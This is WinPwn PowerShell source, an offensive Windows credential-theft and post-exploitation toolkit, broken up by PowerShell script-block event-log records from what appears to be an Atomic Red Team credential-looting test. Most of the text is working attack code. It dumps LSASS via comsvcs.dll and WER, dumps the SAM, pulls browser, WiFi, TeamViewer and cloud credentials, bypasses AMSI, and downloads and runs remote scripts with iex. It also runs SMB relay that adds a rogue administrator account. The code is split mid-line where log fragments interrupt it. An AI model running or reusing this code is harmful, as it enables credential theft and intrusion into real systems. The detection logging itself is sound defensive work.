+                3{if(isadmin){Dumplsass}else{Write-Host -ForegroundColor Red "You need to use an elevated process (lokal Admin)"}}
+                4{if(isadmin){NanoDumpChoose}else{Write-Host -ForegroundColor Red "You need to use an elevated process (lokal Admin)"}}
+             }
+        }
+        While ($masterquestion -ne 5)
+
+}
+
+function NanoDumpChoose
+{
+        do
+        {
+       @'
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+   --> NanoDump Submenu
+'@
+            Write-Host "================ WinPwn ================"
+            Write-Host -ForegroundColor Green '1. Dump LSASS with a valid signature! '
+            Write-Host -ForegroundColor Green '2. Dump LSASS with an invalid signature, has to be restored afterwards (see NanoDump README)! '
+            Write-Host -ForegroundColor Green '3. Go back '
+            Write-Host "================ WinPwn ================"
+            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+            
+            Switch ($masterquestion) 
+            {
+                1{if(isadmin){NanoDump -valid}}
+                2{if(isadmin){NanoDump}}
+            }
+        }
+        While ($masterquestion -ne 3)
+
+}
+
+function NanoDump
+{
+<#
+    .DESCRIPTION
+        Execute NanoDump Shellcode to dump lsass.
+        Main Credits to https://github.com/helpsystems/nanodump
+        Author: Fabian Mosch, Twitter: @ShitSecure
+    #>
+
+Param
+    (
+        [switch]
+        $valid
+)
+
+    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-NanoDump.ps1')
+
+    if ($valid)
+    {
+        Invoke-NanoDump -valid
+    }
+    else
+    {
+        Invoke-NanoDump
+    }
+}
+
+function werDump
+{
+  <#
+        .DESCRIPTION
+        Dump lsass via wer, credit goes to https://twitter.com/JohnLaTwC/status/1411345380407578624
+        Author: @S3cur3Th1sSh1t
+    #>
+    Write-Host "Dumping to C:\windows\temp\dump.txt"
+    $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting');$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic');$Flags = [Reflection.BindingFlags] 'NonPublic, Static';$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags);$ProcessDumpPath = 'C:\windows\temp\dump.txt';$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create);$p=Get-Process lsass;$Result = $MiniDumpWriteDump.Invoke($null, @($p.Handle,$p.Id,$FileStream.SafeFileHandle,[UInt32] 2,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));$FileStream.Close()
+    if (test-Path "C:\windows\temp\dump.txt")
+    {
+        Write-Host "Lsass dump success: " $Result
+    }
+
+}
+
+function HandleKatz
+{
+  <#
+        .DESCRIPTION
+        Dump lsass, credit goes to https://github.com/codewhitesec/HandleKatz, @thefLinkk
+        Author: @S3cur3Th1sSh1t
+    #>
+     param(
+        [switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput
+        )
+    if(!$consoleoutput){pathcheck}
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    if (isadmin)
+    {
+      $processes = Get-Process
+      $dumpid = foreach ($process in $processes){if ($process.ProcessName -eq "lsass"){$process.id}}
+      
+      iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-Handlekatz.ps1')
+      
+      Write-Host "Trying to dump the ID: $dumpid"
+      Sleep 2
+
+      Invoke-HandleKatz -handProcID $dumpid
+      
+      Write-Host "The dump via HandleKatz is obfuscated to avoid lsass dump detections on disk. To decode it you can/should use the following: https://github.com/codewhitesec/HandleKatz/blob/main/Decoder.py"
+    }
+    else{Write-Host "No Admin rights, start again using a privileged session!"}
+}
+
+function Decryptteamviewer
+{
+  param(
+        [switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput
+        )
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    if(!$consoleoutput){pathcheck}
+    # Wrote this Script myself, credit goes to @whynotsecurity - https://whynotsecurity.com/blog/teamviewer/
+    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/TeamViewerDecrypt/master/TeamViewerDecrypt.ps1')
+    if(!$consoleoutput){
+        TeamviewerDecrypt >> $currentPath\Exploitation\TeamViewerPasswords.txt
+        Get-Content $currentPath\Exploitation\TeamViewerPasswords.txt
+        Start-Sleep 5
+    }
+    else{
+        TeamviewerDecrypt
+    }
+}
+function SharpCloud
+{
+  param(
+        [switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput
+        )
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    if(!$consoleoutput){pathcheck}
+    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpCloud.ps1')
+    if(!$consoleoutput){
+        Invoke-SharpCloud -Command all >> $currentPath\Exploitation\CloudCreds.txt
+        Get-Content $currentPath\Exploitation\CloudCreds.txt
+        Start-Sleep 5
+    }
+    else{Invoke-SharpCloud -Command all}
+}
+
+function Safedump
+{
+  param(
+        [switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput
+        )
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    if(!$consoleoutput){pathcheck}
+    blocketw
+    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
+    
+	if ($S3cur3Th1sSh1t_repo -eq "https://raw.githubusercontent.com/S3cur3Th1sSh1t")
+	{
+		Invoke-Sharpcradle -uri https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Ghostpack/SafetyKatz.exe?raw=true
+	}
+	else
+	{
+		Invoke-Sharpcradle -uri $S3cur3Th1sSh1t_repo/Creds/master/Ghostpack/SafetyKatz.exe
+	}
+}
+    
+function Obfuskittiedump
+{
+  param(
+        [switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput
+        )
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    if(!$consoleoutput){pathcheck}
+    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/mimi.ps1')
+    Write-Host -ForegroundColor Yellow "Dumping Credentials output goes to .\Exploitation\Credentials.txt"
+    if(!$consoleoutput){
+        Invoke-TheKatz >> $currentPath\Exploitation\Credentials.txt
+        Get-Content $currentPath\Exploitation\Credentials.txt
+        Start-Sleep -Seconds 5
+    }else{Invoke-TheKatz}
+}
+function Wificreds
+{
+  param(
+        [switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput
+        )
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    if(!$consoleoutput){pathcheck}
+    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Get-WLAN-Keys.ps1')
+    Write-Host "Saving to .\Exploitation\WIFI_Keys.txt"
+    if(!$consoleoutput){
+        Get-WLAN-Keys >> $currentPath\Exploitation\WIFI_Keys.txt
+        Get-Content $currentPath\Exploitation\WIFI_Keys.txt
+        Start-Sleep -Seconds 5
+    }else{Get-WLAN-Keys}
+}
+    
+function Kittenz
+{
+  param(
+        [switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput
+        )
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    if(!$consoleoutput){pathcheck}
+    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/obfuskittie.ps1')
+    Write-Host -ForegroundColor Yellow 'Running the small kittie, output to .\Exploitation\kittenz.txt'
+    if(!$consoleoutput){
+        inbox | out-string -Width 5000 >> $currentPath\Exploitation\kittenz.txt
+        Get-Content $currentPath\Exploitation\kittenz.txt
+        Start-Sleep -Seconds 5
+    }else{inbox | out-string -Width 5000}
+}
+    
+function Samfile
+{
+  param(
+        [switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput
+        )
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    if(!$consoleoutput){pathcheck}
+    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-PowerDump.ps1')
+    Write-Host "Dumping SAM, output to .\Exploitation\SAMDump.txt"
+    if(!$consoleoutput){
+        Invoke-PowerDump >> $currentPath\Exploitation\SAMDump.txt
+        Get-Content $currentPath\Exploitation\SAMDump.txt
+        Start-Sleep -Seconds 5
+    }else{Invoke-PowerDump}
+}
+
+function Dumplsass
+{
+  <#
+        .DESCRIPTION
+        Dump lsass, credit goes to https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/
+        Author: @S3cur3Th1sSh1t
+        License: BSD 3-Clause
+    #>
+     param(
+        [switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput
+        )
+    if(!$consoleoutput){pathcheck}
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    if (isadmin)
+    {
+      try{
+      $processes = Get-Process
+      $dumpid = foreach ($process in $processes){if ($process.ProcessName -eq "lsass"){$process.id}}
+      Write-Host "Found lsass process with ID $dumpid - starting dump with rundll32"
+      if(!$consoleoutput){
+            Write-Host "Dumpfile goes to .\Exploitation\$env:computername.log "
+          rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $dumpid $currentPath\Exploitation\$env:computername.log full
+        }
+        else{
+            Write-Host "Dumpfile goes to C:\windows\temp\$env:computername.log "
+            rundll32 C:\Windows\System32\comsvcs.dll, MiniDump $dumpid C:\windows\temp\$env:computername.log full
+        }
+    }
+    catch{
+      Write-Host "Something went wrong, using safetykatz instead"
+                 iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/SafetyDump.ps1')
+                 if(!$consoleoutput){
+                    Write-Host -ForegroundColor Yellow 'Dumping lsass to .\Exploitation\debug.bin :'
+                    Safetydump
+                move C:\windows\temp\debug.bin $currentPath\Exploitation\debug.bin
+                }
+                else
+                {
+                    Write-Host -ForegroundColor Yellow 'Dumping lsass to C:\windows\temp\debug.bin :'
+                    Safetydump
+                }
+      }
+    }
+    else{Write-Host "No Admin rights, start again using a privileged session!"}
+}
+
+function Kernelexploits
+{
+  <#
+        .DESCRIPTION
+        Get a SYSTEM Shell using Kernel exploits. Most binaries are the original poc exploits loaded via Invoke-Refl3ctiv3Pe!njection + obfuscated afterwards for @msi bypass
+        Author: @S3cur3Th1sSh1t
+        License: BSD 3-Clause
+    #>
+    #Exploitation
+    pathcheck
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    @'
+
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+
+   --> Get System @S3cur3Th1sSh1t
+
+'@
+        
+    do
+    {
+        Write-Host "================ WinPwn ================"
+      Write-Host -ForegroundColor Green '1. MS15-077 - (XP/Vista/Win7/Win8/2000/2003/2008/2012) x86 only!'
+      Write-Host -ForegroundColor Green '2. MS16-032 - (2008/7/8/10/2012)!'
+        Write-Host -ForegroundColor Green '3. MS16-135 - (WS2k16 only)! '
+        Write-Host -ForegroundColor Green '4. CVE-2018-8120 - May 2018, Windows 7 SP1/2008 SP2,2008 R2 SP1! '
+        Write-Host -ForegroundColor Green '5. CVE-2019-0841 - April 2019!'
+        Write-Host -ForegroundColor Green '6. CVE-2019-1069 - Polarbear Har
+
+ScriptBlock ID: cfbd832f-4232-4aee-889d-e8ca30b60e75
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\T1555_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Log3
+10/01/2024 10:33:02 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=3
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=警告
+RecordNumber=2450
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 2，共 16):
+$argument1 -argument2 $argument2
+                }
+                else{Invoke-Sharpcradle -uri $url -argument1 $argument1}
+             
+            }
+
+            	
+    }
+}
+
+function isadmin
+{
+    # Check if Elevated
+    $isAdmin = ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
+    return $isAdmin
+}
+
+function Inveigh {
+  <#
+      .DESCRIPTION
+        Starts Inveigh in a parallel window.
+        Author: @S3cur3Th1sSh1t
+        License: BSD 3-Clause
+    #>
+    pathcheck
+    $currentip = Get-currentIP
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    $relayattacks = Read-Host -Prompt 'Do you want to execute SMB-Relay attacks? (yes/no)'
+    
+    if ($relayattacks -eq "yes" -or $relayattacks -eq "y" -or $relayattacks -eq "Yes" -or $relayattacks -eq "Y")
+    {
+        Write-Host 'Starting WinPwn in a new window so that you can use this one for Invoke-TheHash'
+        invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''$S3cur3Th1sSh1t_repo/WinPwn/master/WinPwn.ps1'');WinPwn -repo $S3cur3Th1sSh1t_repo;}'
+        $target = Read-Host -Prompt 'Please Enter an IP-Adress as target for the relay attacks'
+        $admingroup = Read-Host -Prompt 'Please Enter the name of your local administrators group: (varies for different countries)'
+        $Wcl = new-object System.Net.WebClient
+        $Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
+
+        IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + "/Creds/master/obfuscatedps/Invoke-InveighRelay.ps1")
+        IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + "/Creds/master/obfuscatedps/Invoke-SMBClient.ps1")
+        IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + "/Creds/master/obfuscatedps/Invoke-SMBEnum.ps1")
+        IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + "/Creds/master/obfuscatedps/Invoke-SMBExec.ps1")
+
+        Invoke-InveighRelay -ConsoleOutput Y -StatusOutput N -Target $target -Command "net user pwned 0WnedAccount! /add; net localgroup $admingroup pwned /add" -Attack Enumerate,Execute,Session
+
+        Write-Host 'You can now check your sessions with Get-Inveigh -Session and use Invoke-SMBClient, Invoke-SMBEnum and Invoke-SMBExec for further recon/exploitation'
+    }
+    
+    $adidns = Read-Host -Prompt 'Do you want to start Inveigh with Active Directory-Integrated DNS dynamic Update attack? (yes/no)'
+    if ($adidns -eq "yes" -or $adidns -eq "y" -or $adidns -eq "Yes" -or $adidns -eq "Y")
+    {   
+        if (isadmin)
+        {
+                cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/amsi.ps1');IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -ADIDNS Combo -ADIDNSThreshold 2 -IP $IPaddress.IPv4Address.IPAddress -FileOutput Y -FileOutputDirectory $currentPath\;}
+    }
+        else 
+        {
+               cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/amsi.ps1');IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -ADIDNS Combo -ADIDNSThreshold 2 -IP $IPaddress.IPv4Address.IPAddress -FileOutput Y -FileOutputDirectory $currentPath\;}
+      }
+    }
+    else
+    {
+        if (isadmin)
+        {
+                cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/amsi.ps1');IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -IP $IPaddress.IPv4Address.IPAddress -FileOutput Y -FileOutputDirectory $currentPath\;}
+		
+        }
+        else 
+        {
+               cmd /c start powershell -Command {$IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"};$currentPath = (Get-Item -Path ".\" -Verbose).FullName;$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/amsi.ps1');IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -FileOutput Y -IP $IPaddress.IPv4Address.IPAddress -FileOutputDirectory $currentPath\;}
+	       
+        }
+    }
+}
+
+
+function adidnsmenu
+{
+
+    pathcheck
+    do
+        {
+       @'
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+   --> ADIDNS menu @S3cur3Th1sSh1t
+'@
+            Write-Host "================ WinPwn ================"
+            Write-Host -ForegroundColor Green '1. Add ADIDNS Node! '
+            Write-Host -ForegroundColor Green '2. Remove ADIDNS Node! '
+            Write-Host -ForegroundColor Green '3. Add Wildcard entry! '
+            Write-Host -ForegroundColor Green '4. Remove Wildcard entry'
+          Write-Host -ForegroundColor Green '5. Go back '
+            Write-Host "================ WinPwn ================"
+            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+            
+            Switch ($masterquestion) 
+            {
+                1{adidns -add}
+                2{adidns -remove}
+                3{adidns -addwildcard}
+                4{adidns -removewildcard}
+             }
+        }
+        While ($masterquestion -ne 5)
+         
+           
+}
+
+
+
+function adidns
+{
+         param(
+        [switch]
+        $addwildcard,
+        [switch]
+        $removewildcard,
+        [switch]
+        $add,
+        [switch]
+        $remove
+  )
+    pathcheck
+    # Kevin-Robertsons Powermad for Node creation
+    IEX(New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + "/Creds/master/PowershellScripts/Powermad.ps1")
+    if ($addwildcard)
+    {
+        $adidns = Read-Host -Prompt 'Are you REALLY sure, that you want to create a Active Directory-Integrated DNS Wildcard record? This can in the worst case cause network disruptions for all clients and servers for the next hours! (yes/no)'
+        if ($adidns -eq "yes" -or $adidns -eq "y" -or $adidns -eq "Yes" -or $adidns -eq "Y")
+        {
+            $target = read-host "Please enter the IP-Adress for the wildcard entry"
+          New-ADIDNSNode -Node * -Tombstone -Verbose -data $target
+            Write-Host -ForegroundColor Red 'Be sure to remove the record with `Remove-ADIDNSNode -Node * -Verbose` at the end of your tests'
+        }
+    }
+    if($removewildcard)
+    {
+        Remove-ADIDNSNode -Node *
+    }
+    if($add)
+    {
+       $target = read-host "Please enter the IP-Adress for the ADIDNS entry"
+       $node = read-host "Please enter the Node name"
+     New-ADIDNSNode -Node $node -Tombstone -Verbose -data $target
+    }
+    if($remove)
+    {
+       $node = read-host "Please enter the Node name to be removed"
+     Remove-ADIDNSNode -Node $node
+    }
+
+           
+}
+
+function SessionGopher 
+{
+    <#
+      .DESCRIPTION
+        Starts slightly obfuscated SessionGopher to search for Cached Credentials.
+        Author: @S3cur3Th1sSh1t
+        License: BSD 3-Clause
+    #>
+     param(
+        [switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput,
+        [Switch]
+        $allsystems
+  )
+    if(!$consoleoutput){pathcheck}
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/segoph.ps1')
+    $whole_domain = "no"
+    if (!$noninteractive){$whole_domain = Read-Host -Prompt 'Do you want to start SessionGopher search over the whole domain? (yes/no) - takes a lot of time'}
+    if ($whole_domain -eq "yes" -or $whole_domain -eq "y" -or $whole_domain -eq "Yes" -or $whole_domain -eq "Y")
+    {
+            
+          $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a fuckin lot of time'
+            if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
+            {
+                Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
+                if(!$consoleoutput){Invoke-S3ssionGoph3r -Thorough -AllDomain >> "$currentPath\LocalRecon\SessionGopher.txt"}else{Invoke-S3ssionGoph3r -Thorough -AllDomain}
+            }
+            else 
+            {
+                Write-Host -ForegroundColor Yellow 'Starting SessionGopher without thorough tests, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
+                if(!$consoleoutput){Invoke-S3ssionGoph3r -Alldomain >> $currentPath\LocalRecon\SessionGopher.txt}else{Invoke-S3ssionGoph3r -Alldomain}
+            }
+    }
+    else
+    {
+        $session = "no"
+      if(!$noninteractive)
+        {
+            $session = Read-Host -Prompt 'Do you want to start SessionGopher with thorough tests? (yes/no) - takes a lot of time'
+        }
+            if ($session -eq "yes" -or $session -eq "y" -or $session -eq "Yes" -or $session -eq "Y")
+            {
+                Write-Host -ForegroundColor Yellow 'Starting Local SessionGopher, output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
+                Invoke-S3ssionGoph3r -Thorough >> $currentPath\LocalRecon\SessionGopher.txt -Outfile
+            }
+            else 
+            {
+                Write-Host -ForegroundColor Yellow 'Starting SessionGopher without thorough tests,output is generated in '$currentPath'\LocalRecon\SessionGopher.txt:'
+                Invoke-S3ssionGoph3r >> $currentPath\LocalRecon\SessionGopher.txt
+            }
+    }
+    if ($noninteractive -and $consoleoutput)
+    {
+        if ($allsystems)
+        {
+            Invoke-S3ssionGoph3r -AllDomain
+        }
+        Invoke-S3ssionGoph3r -Thorough
+    }
+}
+
+
+function Kittielocal 
+{
+    <#
+      .DESCRIPTION
+        Dumps Credentials from Memory / Registry / SAM Database / Browsers / Files / DPAPI.
+        Author: @S3cur3Th1sSh1t
+        License: BSD 3-Clause
+    #>
+    param(
+        [switch]
+        $noninteractive,
+        [Switch]
+        $consoleoutput,
+        [switch]
+        $credentialmanager,
+        [switch]
+        $mimikittie,
+        [switch]
+        $rundll32lsass,
+        [switch]
+        $lazagne,
+        [switch]
+        $browsercredentials,
+        [switch]
+        $mimikittenz,
+        [switch]
+        $wificredentials,
+        [switch]
+        $samdump,
+        [switch]
+        $sharpcloud,
+        [Switch]
+        $teamviewer
+    )
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    if(!$consoleoutput){pathcheck}
+    AmsiBypass
+    if ($noninteractive)
+    {
+        if ($credentialmanager)
+        {
+            iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/DumpWCM.ps1')
+            Write-Host "Dumping now, output goes to .\Exploitation\WCMCredentials.txt"
+            if(!$consoleoutput){Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt}else{Invoke-WCMDump}
+        }
+        if($mimikittie)
+        {
+            if (isadmin){if(!$consoleoutput){obfuskittiedump -noninteractive}else{obfuskittiedump -noninteractive -consoleoutput}}
+        }
+        if($rundll32lsass)
+        {
+            if(isadmin){if(!$consoleoutput){dumplsass -noninteractive}else{dumplsass -noninteractive -consoleoutput}}
+        }
+        if($lazagne)
+        {
+            if(!$consoleoutput){lazagnemodule -noninteractive}else{lazagnemodule -noninteractive -consoleoutput}
+        }
+        if($browsercredentials)
+        {
+            Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'
+            iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
+            if(!$consoleoutput){Invoke-Sharpweb -command "all" >> $currentPath\Exploitation\Browsercredentials.txt}else{Invoke-Sharpweb -command "all"}
+        }
+        if($mimikittenz)
+        {
+            if(!$consoleoutput){kittenz -noninteractive}else{kittenz -noninteractive -consoleoutput}
+        }
+        if($wificredentials)
+        {
+            if(isadmin){if(!$consoleoutput){wificreds}else{wificreds -noninteractive -consoleoutput}}
+        }
+        if ($samdump)
+        {
+            if(isadmin){if(!$consoleoutput){samfile}else{samfile -noninteractive -consoleoutput}}
+        }
+        if ($sharpcloud)
+        {
+            if(!$consoleoutput){SharpCloud}else{SharpCloud -noninteractive -consoleoutput}
+        }
+        if ($teamviewer)
+        {
+            if(!$consoleoutput){decryptteamviewer}else{decryptteamviewer -consoleoutput -noninteractive}
+        } 
+        return
+    }
+      
+        do
+        {
+       @'
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+   --> Get some credentials
+'@
+            Write-Host "================ WinPwn ================"
+            Write-Host -ForegroundColor Green '1. Just run Invoke-WCMDump (no Admin need)! '
+            Write-Host -ForegroundColor Green '2. Run an obfuscated version of the powerhell kittie! '
+            Write-Host -ForegroundColor Green '3. Run Safetykatz in me
+
+ScriptBlock ID: cfbd832f-4232-4aee-889d-e8ca30b60e75
+路径: 
+Collapse
+host = DESKTOP-J7QIHDKsource = C:\Users\nus\Desktop\TTP_logs\T1555_powershell.evtxsourcetype = WinEventLog:Microsoft-Windows-PowerShell/Operational
+
+Atomic Test #7 - WinPwn - Loot local Credentials - Wifi Credentials
+
+Log1
+10/01/2024 10:33:02 AM
+LogName=Microsoft-Windows-PowerShell/Operational
+EventCode=4104
+EventType=3
+ComputerName=DESKTOP-J7QIHDK
+User=S-1-5-21-2868460691-234795373-3089146751-1001
+Sid=S-1-5-21-2868460691-234795373-3089146751-1001
+SidType=129
+SourceName=Microsoft-Windows-PowerShell
+Type=警告
+RecordNumber=2451
+Keywords=None
+TaskCategory=执行远程命令
+OpCode=在创建调用时
+Message=正在创建 Scriptblock 文本(已完成 3，共 16):
+mory (Admin session only)! '
+            Write-Host -ForegroundColor Green '4. Only dump lsass using rundll32 technique! (Admin session only) '
+            Write-Host -ForegroundColor Green '5. Download and run an obfuscated lazagne executable! '
+            Write-Host -ForegroundColor Green '6. Dump Browser credentials using Sharpweb! (no Admin need)'
+            Write-Host -ForegroundColor Green '7. Run mimi-kittenz for extracting juicy info from memory! (no Admin need)'
+            Write-Host -ForegroundColor Green '8. Get some Wifi Credentials! (Admin session only)'
+          Write-Host -ForegroundColor Green '9. Dump SAM-File for NTLM Hashes! (Admin session only)'
+          Write-Host -ForegroundColor Green '10. Check for the existence of credential files related to AWS, Microsoft Azure, and Google Compute!'
+    Write-Host -ForegroundColor Green '11. Decrypt Teamviewer Passwords!'
+          Write-Host -ForegroundColor Green '12. Go back '
+            Write-Host "================ WinPwn ================"
+            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+            
+            Switch ($masterquestion) 
+            {
+                1{iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/DumpWCM.ps1');Write-Host "Dumping now, output goes to .\Exploitation\WCMCredentials.txt"; Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt}
+                2{if (isadmin){obfuskittiedump}}
+                3{if(isadmin){safedump}}
+                4{if(isadmin){dumplsass}}
+                5{lazagnemodule}
+                6{Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\';iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1'); Invoke-Sharpweb -command "all" >> $currentPath\Exploitation\Browsercredentials.txt}
+            7{kittenz}
+            8{if(isadmin){wificreds}}
+            9{if(isadmin){samfile}}
